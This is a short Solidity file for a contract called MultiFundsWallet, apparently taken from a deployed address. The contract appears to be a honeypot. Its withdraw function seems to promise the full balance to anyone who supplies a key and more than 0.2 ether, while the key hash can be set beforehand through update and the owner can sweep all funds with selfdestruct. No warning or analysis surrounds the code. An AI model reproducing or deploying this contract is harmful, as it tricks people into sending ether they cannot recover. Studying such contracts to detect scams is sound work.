/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MultiFundsWallet at 0x6fc1ee575e9023aea1c45b4dfc9acf603ea9f63f
*/
pragma solidity ^0.4.24;

contract MultiFundsWallet
{
    bytes32 keyHash;
    address owner;
    
    constructor() public {
        owner = msg.sender;
    }
 
    function setup(string key) public 
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }
    
    function withdraw(string key) public payable 
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.2 ether) {
                msg.sender.transfer(address(this).balance);      
            }
        }
    }
    
    function update(bytes32 _keyHash) public 
    {
        if (keyHash == 0x0) {
            keyHash = _keyHash;
        }
    }
    
    function clear() public 
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function () public payable {
        
    }
}